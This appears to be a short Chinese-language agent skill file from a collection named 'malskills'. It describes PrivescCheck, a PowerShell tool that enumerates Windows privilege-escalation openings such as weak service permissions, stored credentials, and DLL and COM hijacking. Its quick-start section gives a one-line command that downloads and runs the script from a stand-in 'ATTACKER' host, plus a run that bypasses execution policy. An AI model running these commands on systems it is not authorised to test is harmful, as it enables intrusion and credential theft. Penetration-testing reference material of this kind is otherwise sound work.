---
name: "privesccheck"
description: ">"
---

# Privesccheck

*Sourced from killvxk-malskills-zh*

# PrivescCheck

纯 PowerShell Windows 权限提升枚举工具。

## 快速开始

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER/PrivescCheck.ps1"); Invoke-PrivescCheck
Invoke-PrivescCheck -Extended
Invoke-PrivescCheck -Report privesc_report -Format HTML
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

## 检查类别

| 类别 | 枚举内容 |
|------|----------|
| 服务 | 未引用路径、弱 DACL、可写二进制文件 |
| 计划任务 | 可写的任务脚本 / 二进制文件 |
| 注册表 | AlwaysInstallElevated、AutoRun 键 |
| 凭据 | GPP 密码、存储的 Windows 凭据 |
| 当前用户 | Token 权限、组成员 |
| COM 对象 | 可劫持的 COM 注册 |
| DLL 劫持 | PATH / CWD DLL 搜索顺序滥用 |

## 输出严重等级

| 等级 | 含义 |
|------|------|
| Info | 所有发现（含信息级，默认） |
| Low | 仅中等及以上严重性 |
| Medium | 仅高严重性 |

## 资源

| 文件 | 加载时机 |
|------|----------|
| `references/` | DLL 劫持利用、COM 劫持利用 |

